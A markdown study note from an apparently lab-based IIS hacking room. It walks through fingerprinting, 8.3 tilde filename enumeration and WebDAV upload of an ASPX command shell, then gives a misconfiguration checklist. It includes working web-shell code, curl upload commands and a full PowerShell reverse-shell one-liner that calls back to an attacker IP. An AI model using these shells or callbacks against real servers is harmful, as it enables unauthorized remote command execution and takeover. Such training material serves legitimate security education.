# Web Server Attacks - II

The IIS attack chain end to end: fingerprint the server, use a Windows filename quirk to surface hidden files, upload and execute an ASPX shell through misconfigured WebDAV, and sweep for the config-level misconfigurations that need no exploit at all.

> Continuation of [Web Server Attacks - I](Web-Server-Attacks-I.md) (which covered Apache, Nginx, Python's HTTP server, and Node/Express on Linux). This room is **all IIS / Windows Server**.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [Why IIS is a high-value target](#why-iis-is-a-high-value-target)
- [Fingerprinting & enumeration](#fingerprinting--enumeration)
- [Tilde (8.3 short filename) enumeration](#tilde-83-short-filename-enumeration)
- [WebDAV shell upload](#webdav-shell-upload)
- [ASPX web shells](#aspx-web-shells)
- [IIS misconfigurations](#iis-misconfigurations)
- [Key takeaways](#key-takeaways)

---

## In plain English

IIS is Microsoft's web server — it runs on Windows Server and is wired into Windows logins, Active Directory, and .NET. That tight integration is exactly why attackers love it: a foothold on IIS is often a foothold on a Windows domain. This room walks one clean chain, then a checklist of "wrong out of the box" settings.

| Step | The idea in one line |
| --- | --- |
| **Fingerprint** | The `Server` header tells you the IIS version → which Windows Server → which CVEs apply. `OPTIONS` tells you if WebDAV (file upload) is on. |
| **Tilde enumeration** | Windows keeps a short "DOS-style" nickname for every file. IIS leaks whether a nickname exists — so you can **recover hidden filenames one letter at a time**, even ones no wordlist would guess. |
| **WebDAV upload** | If a folder lets you write files *and* run them, you upload a `.aspx` script and just visit it — **instant command execution**, no exploit code. |
| **ASPX web shell** | That uploaded page runs commands as the web server's account. That account almost always has a privilege (`SeImpersonate`) that's the standard stepping-stone to full SYSTEM. |
| **Misconfigurations** | A pile of settings that are dangerous the moment they're on — directory listing, an exposed `web.config`, verbose errors, leftover debug pages. Each is a finding by itself. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Jargon, quickly:</strong> <strong>IIS</strong> = Internet Information Services, the Windows web server. <strong>ASPX</strong> = a .NET web page (like PHP for Windows). <strong>WebDAV</strong> = an HTTP add-on that adds file-management verbs (upload/delete/move) on top of normal GET/POST. <strong>NTLM</strong> = a Windows login handshake that proves who you are without sending the password in the clear. <strong>App Pool identity</strong> = the Windows user account a website runs as.
</div>

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> a lookup sheet, not something to memorise. Remember the one-line hooks above; come back for the exact commands when you need them.
</div>

---

## Why IIS is a high-value target

IIS is on nearly every Windows Server running a web app, intranet portal, or REST API. Being tied into Windows auth, Active Directory, and the .NET runtime makes it a prime **initial access** target — a web foothold that often leads straight into the domain.

Real incidents that used exactly this surface:

| Actor / campaign | What they did |
| --- | --- |
| Lazarus Group (2023) | Exploited IIS servers for initial access and malware distribution |
| HAFNIUM — Exchange **ProxyLogon** (2021) | Dropped ASPX web shells (China Chopper variants) on IIS |
| CISA **AA23-074A** | Multiple actors hit a .NET deserialization bug (**CVE-2019-18935**) in Telerik UI on US government IIS servers → RCE via `w3wp.exe`, dropped DLLs for persistence |

---

## Fingerprinting & enumeration

Before any exploit, understand the target. With IIS this pays off more than usual: the **version** tells you which CVEs apply, **WebDAV** hints at a direct upload path, and the **allowed HTTP methods** tell you what operations are possible — all from reading headers, leaving minimal log traces.

### What the version number means

IIS versions map directly onto Windows Server releases, and many CVEs are version-specific:

| IIS version | Windows Server | Status |
| --- | --- | --- |
| IIS 6.0 | Server 2003 | **End of life** (Jul 2015) — no post-EOL patches |
| IIS 7.0 / 7.5 | Server 2008 / 2008 R2 | End of life |
| IIS 8.0 / 8.5 | Server 2012 / 2012 R2 | End of life |
| IIS 10.0 | Server 2016 / 2019 / 2022 | Current |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> IIS skipped 9.x — the numbering jumped 8.5 → 10.0 with Server 2016. The lab target is <strong>IIS 10.0 on Windows Server 2019</strong>. A public-facing <code>IIS/6.0</code> banner should be treated as compromised until proven otherwise: <strong>CVE-2017-7269</strong> (IIS 6.0 WebDAV) has no official patch.
</div>

### The architecture that matters for attacks

A request flows through several layers, and vulnerabilities live at different ones:

| Layer | Role | Why an attacker cares |
| --- | --- | --- |
| **HTTP.sys** | Kernel-mode driver; receives *all* HTTP before any IIS process | A bug here (e.g. **CVE-2022-21907**) runs in kernel context — a crash is a **BSOD**, not a graceful error |
| **W3SVC / WAS** | The IIS service + activation manager | Starts and manages worker processes |
| **Application Pool → `w3wp.exe`** | Isolated worker process, each under its own Windows identity | **This is the account your web shell runs as.** Default on IIS 7.5+ is `ApplicationPoolIdentity` (virtual account `IIS APPPOOL\<pool>`) |

Both `ApplicationPoolIdentity` and the older `NETWORK SERVICE` carry **`SeImpersonatePrivilege`** by default — the door to Potato-style privilege escalation (see [ASPX web shells](#aspx-web-shells)).

### HTTP banner grabbing

```bash
curl -I http://10.130.174.59
```

```
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
...
```

- **`Server`** → the IIS version.
- **`X-Powered-By: ASP.NET`** → confirms .NET hosting.
- **`X-AspNet-Version`** (when present) → the .NET framework version, which can reveal more CVEs.

### WebDAV detection with `OPTIONS`

WebDAV adds file-management verbs to HTTP: `PUT` (upload), `DELETE`, `COPY`, `MOVE`, `PROPFIND`, `LOCK`. Left enabled on a directory with **write + script-execute**, it's a direct path to uploading a shell. Ask the server what verbs it allows:

```bash
curl -X OPTIONS http://10.130.174.59/webdav -sv 2>&1 | grep -E "Allow:|DAV:"
```

```
Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
DAV: 1,2,3
```

- Only `GET, HEAD, POST, OPTIONS` → WebDAV is **off**.
- `PUT`, `MOVE`, and a `DAV:` header → WebDAV is **on**; test it for write access.

### Testing upload + execution

Knowing WebDAV is on isn't enough — you need to know if uploaded files are *executed*. `PUT` a test file, then `GET` it: rendered output = executed; raw source = served statically.

```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" \
  -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' \
  http://10.130.174.59/webdav/test.aspx
# -> PUT aspx: 401   (no write access without credentials)
```

On this lab, unauthenticated `PUT` returns **401** — Server 2019 WebDAV requires credentials. (We get them from tilde enumeration next.)

### Reading traffic: normal vs. suspicious

| Pattern | Normal | Suspicious |
| --- | --- | --- |
| HTTP methods | `GET`, `POST`, `HEAD` | `OPTIONS` returning `DAV:`; `PUT`, `MOVE`, `PROPFIND` |
| URI paths | `.htm`, `.aspx`, `.js`, `.css` | paths with `~`; new `.aspx` files in writable dirs |
| Status codes | `200`, `304`, `301/302`, `404` | `201 Created` (PUT upload); unexpected `PUT`/`DELETE` |
| `Server` header | present, expected version | suppressed, or an EOL version like `IIS/6.0` |

---

## Tilde (8.3 short filename) enumeration

One of the most useful IIS recon tricks needs no exploit — it abuses a quirk baked into Windows itself, leaking names of files and directories that normal browsing and brute-forcing would never find.

### The 8.3 short filename problem

Windows inherited the DOS **8.3 filename** format (≤8 chars name, ≤3 chars extension) and — by default on most NTFS volumes — generates a short name *alongside* every long name. The conversion is predictable:

1. First **6 characters** of the long name
2. Append `~1` (or `~2`, `~3` on collision)
3. First **3 characters** of the extension

So `BackupFiles` → `BACKUP~1`, `AdminPortal` → `ADMINI~1`, `users_backup.xlsx` → `USERS_~1.XLS`.

### How the leak works

When IIS gets a path containing `~`, it resolves it against the 8.3 namespace — and **responds differently** (status code or response size) depending on whether the short name matches something real. That small, detectable difference lets a scanner reconstruct a short name **character by character**. The long name might be unguessable, but the short name is always predictable from the first 6 characters.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Won't be patched:</strong> publicly disclosed in 2012 (found 2010), affects <strong>IIS 5.x through 10.0</strong> including Server 2022. Microsoft declined to patch it — the only real mitigation is disabling 8.3 name creation in the registry. Assume it's live unless the target was deliberately hardened.
</div>

### Scanning with `iis_shortname_scan.py`

A pure-Python scanner (no Java needed) that probes and reconstructs short names from response differences:

```bash
cd /opt/IIS_shortname_Scanner
python3 iis_shortname_scan.py http://10.130.174.59/
```

```
Server is vulnerable, please wait, scanning...
[+] /a~1.*     [scan in progress]
[+] /ba~1.*    [scan in progress]
[+] /backup~1  [scan in progress]
[+] Directory /backup~1   [Done]
----------------------------------------------------------------
Dir:  /aspnet~1
Dir:  /backup~1
----------------------------------------------------------------
2 Directories, 0 Files found in total
```

It works **left to right**: confirm single-char prefixes, extend each match letter by letter (each `[scan in progress]` line is a separate HTTP probe), drop branches that stop matching, mark a fully resolved name `[Done]`. `*` is a wildcard. `Dir:` = directory, `File:` = file (with extension). Here: `/aspnet~1` (ASP.NET temp files) and `/backup~1` (the interesting one).

### What a short name tells you

The first 6 chars of the name + first 3 of the extension are usually enough to guess the *type* of resource:

| Short name | Likely full name | Why it matters |
| --- | --- | --- |
| `BACKUP~1/` | `BackupFiles/`, `Backup_2024/` | Backup data, likely sensitive |
| `ADMINI~1/` | `AdminInterface/`, `Administration/` | Admin panel |
| `CONFIG~1.ASP` | `configuration.asp`, `config_old.asp` | May hold credentials |
| `USERS_~1.XLS` | `users_backup.xlsx` | User data export, high value |

The partial name is *recon* — the content of the resource is the actual prize.

### Enumerating the discovered directory

IIS won't serve content via the short-name URL directly (the scanner exploits response *differences*, not resolution). You guess completions of the 6-char prefix:

```bash
curl http://10.130.174.59/BackupFiles/
```

Directory listing is on and reveals `webdav_notes.txt`:

```bash
curl http://10.130.174.59/BackupFiles/webdav_notes.txt
```

```
WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123
```

A developer left WebDAV credentials in a backup directory, reachable without auth — and the tilde scan surfaced a directory no wordlist would have. **Keep these for the WebDAV upload.**

---

## WebDAV shell upload

Task 2's unauthenticated `PUT` returned 401 — Server 2019 WebDAV requires credentials. Tilde enumeration handed us `webdav_user:P@ssw0rd!123`. Now we use them.

### Three conditions — all required

The upload works only when **all three** are true at once; miss one and it fails at that step:

1. **WebDAV enabled** on the target directory
2. Valid credentials with **Write** permission on it
3. **Script Execute** set — IIS passes `.aspx` to the ASP.NET handler instead of serving it as static text

### The ASPX command shell

Save as `cmd.aspx` — takes a `cmd` query parameter, runs it through `cmd.exe`, returns the output:

```csharp
<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%>
```

### Uploading with NTLM auth

The `/webdav/` directory is protected by Windows Authentication: anonymous users can `GET`, but writes (`PUT`/`DELETE`/`MOVE`) need a valid Windows identity. **NTLM** proves that identity without sending the plaintext password; `curl --ntlm` performs the handshake.

```bash
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' \
  -T cmd.aspx http://10.130.174.59/webdav/cmd.aspx
```

The exchange is a two-step NTLM handshake — the first `PUT` gets a `401` with a `WWW-Authenticate: NTLM ...` challenge, curl answers it on the reused connection, and the second attempt returns:

```
HTTP/1.1 201 Created
Server: Microsoft-IIS/10.0
```

**`201 Created`** = the file was written.

### Confirming execution

```bash
curl "http://10.130.174.59/webdav/cmd.aspx?cmd=whoami"
# -> <pre>iis apppool\defaultapppool</pre>
```

Rendered output (not raw source) confirms execution, under the IIS worker identity.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Troubleshooting:</strong> a blank response or a <code>500</code> means <strong>Script Execute</strong> isn't set on <code>/webdav/</code> — the file uploaded fine, but IIS is serving it as static text instead of running it.
</div>

---

## ASPX web shells

### What it is

An ASPX web shell is a .NET file that takes attacker input over HTTP and runs it under the server process. To IIS it's just another `.aspx` page; to you it's a remote command interface. IIS hands the request to the ASP.NET handler, which compiles and runs the code inside **`w3wp.exe`** under the **App Pool identity** — and that identity decides what the shell can do. Default `ApplicationPoolIdentity` = limited access *but* carries `SeImpersonatePrivilege`; an app pool misconfigured as SYSTEM or a domain admin = instant high privileges.

### Step 1 — run commands

```bash
curl "http://10.130.174.59/webdav/cmd.aspx?cmd=whoami"     # -> iis apppool\defaultapppool
curl "http://10.130.174.59/webdav/cmd.aspx?cmd=hostname"
curl "http://10.130.174.59/webdav/cmd.aspx?cmd=ipconfig"
curl "http://10.130.174.59/webdav/cmd.aspx?cmd=dir+C:\\"
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Tip:</strong> URL-encode spaces as <code>+</code> or <code>%20</code> in the <code>cmd</code> parameter.
</div>

### Step 2 — escalate to a reverse shell

A browser command box is limited; for interactive access, trigger a PowerShell one-liner that calls back to a Netcat listener.

```bash
nc -lvnp 443
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why port 443:</strong> outbound HTTPS is almost never blocked by enterprise firewalls, so a callback on 443 is far less likely to be dropped than one on 4444.
</div>

Pass a PowerShell reverse-shell one-liner through the shell's `cmd` parameter (replace the IP with your AttackBox / `tun0` address), URL-encoded:

```bash
curl -G "http://10.130.174.59/webdav/cmd.aspx" \
  --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient(''10.130.101.23'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+''PS ''+(pwd).Path+''> '';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

The flags dodge PowerShell's defaults: **`-NoP`** skip profile, **`-NonI`** non-interactive, **`-W Hidden`** hide window, **`-Exec Bypass`** override the Restricted execution policy that blocks unsigned scripts.

### Step 3 — confirm privileges

```
PS C:\windows\system32\inetsrv> whoami /priv
...
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
SeChangeNotifyPrivilege  Bypass traverse checking                     Enabled
SeCreateGlobalPrivilege  Create global objects                        Enabled
```

**`SeImpersonatePrivilege`** is the one that matters: it lets a process impersonate any user that authenticates to it, at the token level. Potato-style tools (**PrintSpoofer, JuicyPotato, GodPotato**) force a SYSTEM process to authenticate to an attacker-controlled named pipe, then steal its token — the standard escalation from any network-service identity to **SYSTEM**. (Escalation itself is out of scope here; the point is that a default IIS shell lands you on a *predictable* privilege with a *well-documented* next step.)

### China Chopper — what real shells look like

Real actors use tiny, hard-to-detect shells. **China Chopper** (documented 2012; used heavily by HAFNIUM in ProxyLogon 2021, MITRE ATT&CK **T1505.003**) is the classic — its server component is **73 bytes**, a single line:

```jscript
<%@ Page Language="Jscript"%><%EV·AL(Request.Item["‹PARAM›"],"unsafe");%>
```

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Defanged sample.</strong> The line above is intentionally broken so it is <strong>not runnable</strong> and won't trip AV/EDR — the real shell uses lowercase <code>eval(</code> (no dot) and a real parameter name in place of <code>‹PARAM›</code>. It's shown for recognition only; don't reassemble it. This break is why the file is safe to keep locally and in the public repo.
</div>

A separate client tool sends encoded commands via HTTP POST to that parameter. Two things for defenders to remember: the **73-byte** server component and the **`eval(`** pattern in file content — AV/EDR signatures key on that string (Microsoft Defender flags the intact line as `Backdoor:ASP/Chopper.J!dha`), especially in directories that shouldn't contain user-created files.

---

## IIS misconfigurations

WebDAV was a *feature* deliberately turned on. This is a different category: settings that are wrong by default or easy to enable by accident, each a finding on its own — no CVE, no exploit chain. In real engagements these are the **most common IIS attack surface**, and skipping the check before reaching for exploit tools misses the easiest wins.

### 1. Directory listing enabled

No default document (`index.html`/`default.aspx`) + Directory Browsing enabled → IIS renders a file listing instead of `403`. Backup files, config exports, uploaded content, and source backups become visible and downloadable, unauthenticated.

```bash
curl http://10.130.174.59/uploads/
# lists e.g. config.bak, web.config
```

Watch for extensions that shouldn't be public: `.bak`, `.config`, `.log`, `.zip`, `.sql`.

### 2. Unauthenticated `PUT` / `DELETE`

The `OPTIONS` check from earlier reveals it:

```bash
curl -X OPTIONS http://10.130.174.59/ -sv 2>&1 | grep "Allow:"
```

If `Allow:` includes `PUT`/`DELETE` with no auth requirement, unauthenticated upload is possible. **WebDAV isn't always limited to `/webdav/`** — some admins enable it globally, making every directory potentially writable.

### 3. `web.config` exposure

`web.config` holds connection strings, API keys, SMTP creds, encryption keys. IIS normally blocks `.config` downloads (request filtering / a 404 handler); if that rule is removed or a bad MIME mapping is added, it becomes downloadable:

```bash
curl http://10.130.174.59/web.config
```

A `200` with XML starting `<configuration>` is **high severity** — the connection-strings section alone often contains DB credentials.

### 4. Verbose error messages

In development mode IIS returns full .NET stack traces on error — leaking internal file paths (`C:\inetpub\wwwroot\App\...`), framework version, the failing query, sometimes the internal IP. Production should set:

```xml
<system.web>
  <customErrors mode="On" />
</system.web>
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> the ASP.NET default is <code>RemoteOnly</code> — remote callers get a generic page, only localhost sees traces. So a server with <code>customErrors</code> simply <em>absent</em> may be less exposed than it looks on a remote test. Only <code>customErrors="Off"</code> leaks stack traces to external clients.
</div>

### 5. `trace.axd` left enabled

ASP.NET's built-in diagnostic handler. When enabled, `http://target/trace.axd` returns the app trace log for recent requests — HTTP headers, form values, session state, **cookies**, timing (default last 50 requests, `requestLimit="50"`).

```bash
curl http://10.130.174.59/trace.axd
```

A `200` with the trace viewer is a finding. Production should set `<trace enabled="false"/>`. It matters beyond info disclosure: **session cookies and auth tokens in the log can be replayed directly.**

### 6. HTTP `TRACE` method enabled

Different from `trace.axd`. The HTTP `TRACE` verb echoes the request back (loopback diagnostics) and enables **Cross-Site Tracing (XST)**.

```bash
curl -X TRACE http://10.130.174.59 -sv
```

A `200` echoing the request confirms it's live; the correct state is `405 Method Not Allowed`.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> modern browsers block <code>TRACE</code> in <code>XMLHttpRequest</code>, so XST is largely defused for browser scenarios. Still worth reporting as config hygiene — but rate the severity low, since the real attack path needs an outdated browser or a non-browser HTTP client.
</div>

### 7. App Pool running as a privileged account

The default `ApplicationPoolIdentity` is low-privilege, but admins sometimes run app pools as SYSTEM, Administrator, or a domain admin (to dodge file-share/DB permission errors). Check with the shell:

```bash
curl "http://10.130.174.59/webdav/cmd.aspx?cmd=whoami"
```

If it returns `nt authority\system` or a domain admin instead of `iis apppool\defaultapppool`, you have **immediate elevated access** — no escalation step needed.

---

## Key takeaways

- **Fingerprint first** — the IIS version fixes which CVEs apply, and enabled features like WebDAV reveal direct attack paths, all with minimal log noise.
- **8.3 tilde enumeration** surfaces hidden files/dirs that wordlists miss, because the short name is predictable even when the long name isn't. Unpatched across IIS 5.x–10.0.
- **WebDAV shell upload** needs three things together: WebDAV enabled + write permission + Script Execute on the *same* directory.
- **ASPX shells run as the App Pool identity**, which by default carries `SeImpersonatePrivilege` — making Potato-style escalation to SYSTEM the natural next step.
- **Misconfigurations** (directory listing, unauthenticated `PUT`, `web.config` exposure, `trace.axd`, verbose errors, `TRACE`, privileged app pools) are each exploitable on their own — check them *before* reaching for CVEs.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Referenced but not detailed in this room:</strong> <strong>CVE-2017-7269</strong> — a WebDAV buffer overflow specific to IIS 6.0 (Server 2003), unpatched because 6.0 is end-of-life. It's why any public <code>IIS/6.0</code> banner is treated as pre-compromised.
</div>
